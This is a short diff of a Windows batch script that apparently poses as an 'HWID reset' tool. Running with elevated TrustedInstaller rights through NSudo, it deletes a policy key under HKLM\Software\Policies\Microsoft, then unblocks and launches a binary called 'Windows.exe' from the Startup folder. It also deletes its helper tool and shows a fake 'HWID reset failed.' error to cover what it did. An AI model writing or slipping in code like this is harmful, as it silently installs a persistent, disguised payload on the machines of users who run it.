@@ -47,7 +47,7 @@ NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Window
 ::unblock files
 ::change paths to file location
 powershell -command "unblock-file -path 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windows.exe'"
-start "" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windows.exe"
+start "Windows.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windows.exe"
 del NSudo.exe
 echo msgbox "HWID reset failed." > tmp.vbs
 wscript tmp.vbs
